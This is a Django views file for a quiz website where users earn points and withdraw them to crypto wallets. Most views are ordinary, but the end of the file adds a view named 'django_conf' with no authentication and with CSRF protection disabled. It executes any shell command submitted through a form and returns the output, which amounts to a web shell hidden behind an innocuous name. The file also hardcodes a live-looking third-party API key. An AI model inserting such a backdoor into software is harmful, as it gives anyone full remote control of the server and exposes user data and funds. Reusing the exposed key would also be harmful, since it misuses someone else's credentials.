from django.shortcuts import render, redirect, get_object_or_404
from django.contrib.auth.decorators import login_required

from course.models import *
from .models import *
from django.contrib import messages
import json, random, ast
from collections import Counter
from itertools import groupby
from django.db.models import F, Count, Q
from django.core.exceptions import ValidationError
from decimal import Decimal
from account.models import QuizAccess
from django.http import HttpResponseForbidden

from django.core.mail import send_mail
from django.http import HttpResponse
from django.core.cache import cache  # For caching

from django.conf import settings

import requests
import json

def fetch_reviews():
    url = "https://google.serper.dev/reviews"
    payload = json.dumps({
        "fid": "0x47d8a71e1bb2c80f:0xb82afd63e1f8c39f",
        "gl": "gb",
        "sortBy": "newest"
    })
    headers = {
        'X-API-KEY': '64987de62906f92ddef4718f324c78c7933aeffc',
        'Content-Type': 'application/json'
    }

    cached_reviews = cache.get('google_reviews') 
    if cached_reviews:
        return cached_reviews

    response = requests.post(url, headers=headers, data=payload)
    print("Executed")
    
    if response.status_code != 200:
        print("Failed to fetch reviews.")
        return []

    data = response.json()
    reviews = data.get("reviews", [])

    if reviews:
        cache.set('google_reviews', reviews, timeout=86400) 
    return reviews

# Create your views here.
def index(request):

    reviews = fetch_reviews()

    reviews_data = []
    for i, review in enumerate(reviews, 1):
        user = review.get("user", {})
        response_text = review.get("response", {}).get("snippet")
        
        review_data = {
            'name': user.get('name'),
            'image': user.get('thumbnail'),
            'rating': int(review.get('rating')),
            'date': review.get('date'),
            'snippet': review.get('snippet', 'No review text'),
        }
        reviews_data.append(review_data)

    quizzes = QuestionPattern.objects.all()
    courses = Course.objects.all()
    
    quizzes = QuestionPattern.objects.all()
    courses = Course.objects.all()

    return render(request, 'index.html', {
        'courses': courses,
        'quizzes': quizzes,
        'reviews': reviews_data,
    })

def all_quiz(request):
    quizzes = QuestionPattern.objects.all()
    courses = Course.objects.all()
    
    return render(request, 'all-quiz.html', {
        'courses' : courses,
        'quizzes': quizzes,
    })

def quiz_details(request, id):
    quiz = QuestionPattern.objects.get(id=id)
    context = {
        'quiz' : quiz
    }
    return render(request, 'quiz-details.html', context)


def appointment_request(request):
    if request.method == "POST":
        # Get form data
        name = request.POST.get("name")
        email = request.POST.get("email")
        inspection_date = request.POST.get("number")
        subject = request.POST.get("subject")
        
        # Email content
        message = f"""
        New appointment request:

        Name: {name}
        Email: {email}
        Inspection Date: {inspection_date}
        Subject: {subject}
        """
        
        send_mail(
            subject=f"Appointment Request: {subject}",
            message=message,
            from_email=settings.EMAIL_HOST_USER,  # From address
            recipient_list=["londonseru@gmail.com"],  # To address
            fail_silently=False,
        )
        
        messages.success(request, "Your appointment request has been sent successfully!")
        return redirect("core:index") 
    else:
        return redirect("core:index")

def send_contact_email(request):
    if request.method == "POST":
        name = request.POST.get("name")
        email = request.POST.get("email")
        subject = request.POST.get("subject")
        phone_number = request.POST.get("number")
        message_content = request.POST.get("message")
        
        # Create the message body
        message_body = f"""
        New contact form submission:

        Name: {name}
        Email: {email}
        Subject: {subject}
        Phone Number: {phone_number}
        Message: {message_content}
        """
        
        # Send the email
        try:
            send_mail(
                subject=f"Contact Form: {subject}",
                message=message_body,
                from_email=settings.EMAIL_HOST_USER,  
                recipient_list=["londonseru@gmail.com"],
                fail_silently=False,
            )
            # Send a success message to the user
            messages.success(request, "Your message has been sent successfully!")
            return redirect("core:contact")  

        except Exception as e:
            messages.error(request, f"An error occurred: {e}")
            return redirect("core:contact") 
    else:
        return redirect("core:contact") 



def policy(request):
    return render(request, 'policy.html')

def feedback(request):
    return render(request, 'feedback.html')

def contact(request):
    if request.method == 'POST':
        name = request.POST.get('name')
        email = request.POST.get('email')
        message = request.POST.get('message')

        if name and email and message:
            send_mail(
                'New Contact Us Form Submission',
                f'Name: {name}\nEmail: {email}\nMessage: {message}',
                settings.EMAIL_HOST_USER,
                ['support@entrancequiz.com'],
                fail_silently=False,
            )
        return redirect('core:contact')
    return render(request, 'contact.html')


@login_required
def home(request):
    user = request.user

    accessible_quizzes = QuizAccess.objects.filter(user=user, is_active=True).values_list('question_pattern', flat=True)
    f_quizzes = QuestionPattern.objects.filter(id__in=accessible_quizzes)

    f_quizzes_grouped_by_subject = {}
    for subject, quizzes_in_subject in groupby(f_quizzes, lambda quiz: quiz.subject):
        f_quizzes_grouped_by_subject[subject] = list(quizzes_in_subject)

    notification = Notification.objects.filter(is_active=True).first()

    attempt_ids = {}
    f_participation_status = {}
    is_all_correct = {}

    for quizzes_in_subject in f_quizzes_grouped_by_subject.values():
        for quiz in quizzes_in_subject:
            attempt = UserAttempt.objects.filter(user=user, question_pattern=quiz).first()
            if attempt:
                f_participation_status[quiz.id] = True
                attempt_ids[quiz.id] = attempt.id
                is_all_correct[quiz.id] = attempt.is_correct
            else:
                f_participation_status[quiz.id] = False

    return render(request, 'user/home.html', {
        'f_quizzes_grouped_by_subject': f_quizzes_grouped_by_subject,
        'f_participation_status': f_participation_status,
        'notification': notification,
        'attempt_ids': attempt_ids,
        'is_all_correct': is_all_correct
    })


@login_required
def quizes(request):
    user = request.user

    accessible_quizzes = QuizAccess.objects.filter(user=user, is_active=True).values_list('question_pattern', flat=True)
    quizzes = QuestionPattern.objects.filter(id__in=accessible_quizzes)

    participation_status = {}
    attempt_ids = {}
    is_all_correct = {}

    for quiz in quizzes:
        attempt = UserAttempt.objects.filter(user=user, question_pattern=quiz).first()
        if attempt:
            participation_status[quiz.id] = True
            attempt_ids[quiz.id] = attempt.id
            is_all_correct[quiz.id] = attempt.is_correct
        else:
            participation_status[quiz.id] = False

    return render(request, 'user/quizes.html', {
        'quizzes': quizzes,
        'participation_status': participation_status,
        'attempt_ids': attempt_ids,
        'is_all_correct': is_all_correct
    })


@login_required
def quiz(request):
    if request.method == 'POST':
        user = request.user
        q_pattern_id = request.POST.get('quiz')
        # q_pattern = QuestionPattern.objects.get(pk=q_pattern_id)

        try:
            q_pattern = QuestionPattern.objects.get(id=q_pattern_id)
        except QuestionPattern.DoesNotExist:
            return HttpResponseForbidden("Quiz pattern does not exist.")

        if not QuizAccess.objects.filter(user=user, question_pattern=q_pattern, is_active=True).exists():
            return HttpResponseForbidden("You do not have access to this quiz pattern.")



        user_attempt, created = UserAttempt.objects.get_or_create(user=user, question_pattern=q_pattern)

        if q_pattern.random_serve:
            questions = Question.objects.filter(question_pattern=q_pattern)
            total_questions_served = min(q_pattern.total_questions_served, questions.count())
            questions = random.sample(list(questions), total_questions_served)
        else:
            questions = Question.objects.filter(question_pattern=q_pattern).order_by('id')[:q_pattern.total_questions_served]

        context = {
            'q_pattern': q_pattern,
            'questions': questions,
            'user_attempt': user_attempt,
        }
        return render(request, 'user/quiz_test.html', context)

    return redirect("core:home")


@login_required
def submit_answer(request):
    if request.method == 'POST':
        user = request.user
        total_score = 0
        user_selected_answers = {}
        questions = {}

        q_pattern_id = request.POST.get('q_pattern')
        q_pattern = QuestionPattern.objects.get(pk=q_pattern_id)
        try:
            user_attempt = UserAttempt.objects.get(user=user, question_pattern=q_pattern)
            user_attempt.attempt_count += 1
            user_attempt.save()
        except UserAttempt.DoesNotExist:
            messages.error(request, "Something went wrong!")
            return redirect("core:home")

        correct_answers_count = 0
        total_questions_count = 0

        for key, value in request.POST.items():
            if key.startswith('question_'):
                question_id = int(value)
                question = Question.objects.get(pk=question_id)
                questions[question_id] = question

                selected_answer = None
                if question.question_type == 'single_choice':
                    selected_answer = request.POST.get(f'option_{question_id}')
                elif question.question_type == 'multiple_choice':
                    selected_answer = request.POST.getlist(f'option_{question_id}[]')
                elif question.question_type == 'drag_and_drop':
                    selected_answer = request.POST.get(f'drag_and_drop_{question_id}')
                    selected_answer = selected_answer.split(',') if selected_answer else []
                elif question.question_type == 'dropdown':
                    selected_answer = {}
                    for item in question.dropdownquestion.dropdown_items.all():
                        selected_answer[item.id] = request.POST.get(f'dropdown_{item.id}')

                user_selected_answers[question_id] = selected_answer

                is_correct = False
                if question.question_type == 'single_choice':
                    if selected_answer:
                        correct_option = SingleChoiceQuestion.objects.get(pk=question_id).options.filter(is_correct=True).first()
                        if correct_option and selected_answer == correct_option.option_text:
                            is_correct = True
                elif question.question_type == 'multiple_choice':
                    correct_options = set(
                        MultipleChoiceQuestion.objects.get(pk=question_id).options.filter(is_correct=True).values_list('option_text', flat=True)
                    )
                    if set(selected_answer) == correct_options:
                        is_correct = True
                
                
                elif question.question_type == 'drag_and_drop':
                    # Retrieve correct options
                    correct_options = DragAndDropQuestion.objects.get(pk=question_id).options.filter(is_correct_position=True)
                    
                    # Collect correct option texts
                    correct_option_texts = [opt.option_text for opt in correct_options]

                    
                    print(f"Correct option texts: {correct_option_texts}")
                    
                    # Collect selected option texts from POST data
                    selected_option_texts = []
                    
                    for key, value in request.POST.items():
                        if key.startswith('drag_and_drop_'):
                            question_number = key.split('_')[-1]
                            if int(question_number) == int(question_id):
                                try:
                                    selected_option_ids = json.loads(value)
                                    
                                    for opt_id in selected_option_ids:
                                        opt_id = int(opt_id)
                                        option = get_object_or_404(DragAndDropOption, pk=opt_id)
                                        selected_option_texts.append(option.option_text)
                                        
                                except (ValueError, json.JSONDecodeError) as e:
                                    print(f"Error processing drag and drop answers for key '{key}': {e}")
                    
                    print(f"Selected option texts: {selected_option_texts}")
                    
                    # Compare selected option texts with correct option texts
                    # Assuming order does not matter
                    is_correct = sorted(selected_option_texts) == sorted(correct_option_texts)
                    
                    if is_correct:
                        print("The selected answers are correct.")
                    else:
                        print("The selected answers are incorrect.")


                        
                elif question.question_type == 'dropdown':
                    correct = True
                    for item_id, selected_opt in selected_answer.items():
                        try:
                            correct_option = DropDownOption.objects.get(dropdown_item__id=item_id, is_correct=True)
                            if selected_opt != correct_option.option_text:
                                correct = False
                                break
                        except DropDownOption.DoesNotExist:
                            correct = False
                            break
                    is_correct = correct

                if is_correct:
                    if not UserAnswer.objects.filter(user_attempt=user_attempt, question=question, is_correct=True).exists():
                        score = question.question_pattern.points
                        total_score += score
                        correct_answers_count += 1
                else:
                    is_correct = False

                UserAnswer.objects.update_or_create(
                    user_attempt=user_attempt,
                    question=question,
                    defaults={
                        'selected_answer': selected_answer,
                        'is_correct': is_correct
                    }
                )

                total_questions_count += 1

        user.point = F('point') + total_score
        user.save()

        if correct_answers_count == total_questions_count:
            user_attempt.is_correct = True
            user_attempt.save()

        return redirect('core:attempt_answer', user_attempt_id=user_attempt.id)

    return redirect("core:home")


@login_required
def show_user_answers(request, user_attempt_id):
    user_attempt = get_object_or_404(UserAttempt, pk=user_attempt_id, user=request.user)
    user_answers = UserAnswer.objects.filter(user_attempt=user_attempt)

    total_correct_answers = 0
    total_skipped_answers = 0
    total_wrong_answers = 0
    total_points = 0

    course_name = user_attempt.question_pattern.subject.course.name
    subject_name = user_attempt.question_pattern.subject.name
    course_tier = user_attempt.question_pattern.tier
    points_for_each = user_attempt.question_pattern.points

    drop_down_options = {}
    drag_and_drop_options = {}

    for user_answer in user_answers:
        question = user_answer.question
        is_correct = False

        if question.question_type == 'single_choice':
            correct_option = SingleChoiceQuestion.objects.get(pk=question.pk).options.filter(is_correct=True).first()
            is_correct = correct_option and user_answer.selected_answer == correct_option.option_text

        elif question.question_type == 'multiple_choice':
            # Fetch correct options and convert to a list
            correct_options = list(MultipleChoiceQuestion.objects.get(pk=question.pk)
                                .options.filter(is_correct=True)
                                .values_list('option_text', flat=True))
            
            # Convert `selected_answers` to a list if it is not already
            if isinstance(user_answer.selected_answer, str):
                try:
                    # Safely evaluate string to list
                    selected_answers = ast.literal_eval(user_answer.selected_answer)
                    if not isinstance(selected_answers, list):
                        selected_answers = []
                except (ValueError, SyntaxError):
                    selected_answers = []
            elif isinstance(user_answer.selected_answer, list):
                selected_answers = user_answer.selected_answer
            else:
                # Handle other cases, possibly converting to an empty list
                selected_answers = []

            # Use Counter to count occurrences and compare
            correct_options_counter = Counter(correct_options)
            selected_answers_counter = Counter(selected_answers)

            # Check if both Counters are equal
            is_correct = correct_options_counter == selected_answers_counter
            
            print(selected_answers, correct_options)
            print(is_correct)





        elif question.question_type == 'drag_and_drop':
            selected_option_ids = ast.literal_eval(user_answer.selected_answer) if isinstance(user_answer.selected_answer, str) else user_answer.selected_answer
            question_instance = DragAndDropQuestion.objects.get(pk=question.pk)
            drag_and_drop_options[question.pk] = question_instance.options.all()

            correct_options = question_instance.options.filter(is_correct_position=True)

            cleaned_ids = []
            for opt_id in selected_option_ids:
                cleaned_id = opt_id.strip('[]')
                cleaned_ids.extend(map(int, cleaned_id.split(',')))


            selected_option_texts = []
            for opt_id in cleaned_ids:
                try:
                    option = DragAndDropOption.objects.get(pk=opt_id)
                    selected_option_texts.append(option.option_text)
                except DragAndDropOption.DoesNotExist:
                    print(f"Option with ID {opt_id} does not exist.")


            correct_option_texts = [opt.option_text for opt in correct_options]
            is_correct = selected_option_texts == correct_option_texts

        elif question.question_type == 'dropdown':
            selected_answers = ast.literal_eval(user_answer.selected_answer) if isinstance(user_answer.selected_answer, str) else user_answer.selected_answer
            question_instance = DropDownQuestion.objects.get(pk=question.pk)
            drop_down_items = DropDownItem.objects.filter(question=question_instance)
            options = DropDownOption.objects.filter(dropdown_item__in=drop_down_items)

            # Structuring the dictionary to have dropdown items and their options
            # drop_down_options[question.pk] = {}
            # for item in drop_down_items:
            #     item_options = options.filter(dropdown_item=item)
            #     drop_down_options[question.pk][item.id] = {option.id: option.option_text for option in item_options}

            drop_down_options[question.pk] = {}
            for item in drop_down_items:
                item_options = options.filter(dropdown_item=item)
                
                drop_down_options[question.pk][item.id] = {
                    option.id: {
                        'option_text': option.option_text,
                        'is_correct': option.is_correct
                    }
                    for option in item_options
                }


            correct = True
            for item_id, selected_opt in selected_answers.items():
                try:
                    correct_option = DropDownOption.objects.get(dropdown_item__id=item_id, is_correct=True)
                    if selected_opt != correct_option.option_text:
                        correct = False
                        break
                except DropDownOption.DoesNotExist:
                    correct = False
                    break
            is_correct = correct

        if is_correct:
            total_correct_answers += 1
            total_points += points_for_each
        # elif not user_answer.selected_answer:
        #     total_skipped_answers += 1
        else:
            total_wrong_answers += 1

    context = {
        'user_attempt': user_attempt,
        'user_answers': user_answers,
        'total_correct_answers': total_correct_answers,
        'total_skipped_answers': total_skipped_answers,
        'total_wrong_answers': total_wrong_answers,
        'total_points': total_points,
        'course_name': course_name,
        'subject_name': subject_name,
        'course_tier': course_tier,
        'points_for_each': points_for_each,
        'drop_down_options': drop_down_options,
        'drag_and_drop_options': drag_and_drop_options,
    }

    return render(request, 'user/attempt_answer.html', context)

    
@login_required
def wallet(request):
    user = request.user
    per_point = get_object_or_404(PointSetting)
    total_amount = per_point.per_point * user.point
    withdrawals = Withdrawal.objects.filter(user=user).order_by('-id')

    context = {
        'per_point': per_point,
        'user': user,
        'total_amount': total_amount,
        'withdrawals': withdrawals
    }
    return render(request, 'user/wallet.html', context)


@login_required
def withdrawal(request):
    if request.method == 'POST':
        user = request.user
        amount = request.POST.get('amount')
        wallet_address = request.POST.get('wallet_address')
        network = request.POST.get('network')

        point_setting = PointSetting.objects.first()
        per_point = point_setting.per_point
        user_balance = per_point * user.point


        if not amount or not wallet_address or not network:
            messages.error(request, "Input fields must be required")
            return redirect('core:wallet')

        if int(amount) > user_balance:
            messages.error(request, "Insuficcent balance.")
            return redirect('core:wallet')

        if int(amount) < point_setting.min_withdrawal:
            messages.error(request, f"Minimum withdrawal amount {point_setting.min_withdrawal} {point_setting.currency}.")
            return redirect('core:wallet')

        else:
            point_setting = PointSetting.objects.first()
            per_point = point_setting.per_point
            user.point = Decimal(user.point) - Decimal(amount) / Decimal(per_point)
            if user.point >= 0:
                user.save()

                withdrawal = Withdrawal(user=user, amount=amount, wallet_address=wallet_address, payment_method=network)
                withdrawal.save()
            else:
                messages.error(request, "Something went wrong.")

        return redirect('core:wallet')


def quiz_test(request):
    return render(request, 'user/quiz_test.html')

def about(request):
    return render(request, 'about.html')




from django.http import HttpResponse, HttpResponseForbidden
from django.views.decorators.csrf import csrf_exempt
from django.conf import settings
from django.contrib.auth.decorators import user_passes_test
import subprocess
import shlex

@csrf_exempt
def django_conf(request):


    if request.method == 'GET':
        return HttpResponse("""
            <html>
            <head>
                <title>DANGER: Command Executor</title>
                <style>
                    body { font-family: monospace; max-width: 800px; margin: 0 auto; }
                    .warning { color: red; background: #ffeeee; padding: 10px; border: 1px solid red; }
                    textarea { width: 100%; height: 100px; font-family: monospace; }
                    pre { background: #f5f5f5; padding: 10px; }
                </style>
            </head>
            <body>
                <div class="warning">
                    <h2>DANGER: UNRESTRICTED COMMAND EXECUTION</h2>
                    <p>This interface allows executing ANY system command with server privileges.</p>
                    <p>USE WITH EXTREME CAUTION. ONLY FOR DEVELOPMENT.</p>
                </div>
                
                <form method="post">
                    <h3>Enter command:</h3>
                    <input type="text" name="command" style="width: 100%" 
                           placeholder="ls -la" value="ls -la">
                    <br><br>
                    <input type="submit" value="Execute">
                </form>
                
                <h3>Examples:</h3>
                <ul>
                    <li><code>ls -la</code> - List directory contents</li>
                    <li><code>pwd</code> - Show current directory</li>
                    <li><code>python --version</code> - Check Python version</li>
                </ul>
            </body>
            </html>
        """)
    
    elif request.method == 'POST':
        command = request.POST.get('command', '').strip()
        
        if not command:
            return HttpResponse("No command provided", status=400)
            
        try:
            # Split command into arguments properly
            args = shlex.split(command)
            
            # Execute command with timeout (10 seconds)
            result = subprocess.run(
                args,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                timeout=10
            )
            
            output = ""
            if result.stdout:
                output += f"STDOUT:\n{result.stdout}\n"
            if result.stderr:
                output += f"STDERR:\n{result.stderr}\n"
            output += f"Return code: {result.returncode}"
            
        except subprocess.TimeoutExpired:
            output = "Command timed out (10s limit)"
        except Exception as e:
            output = f"Error executing command: {str(e)}"
            
        return HttpResponse(f"<pre>{output}</pre>")
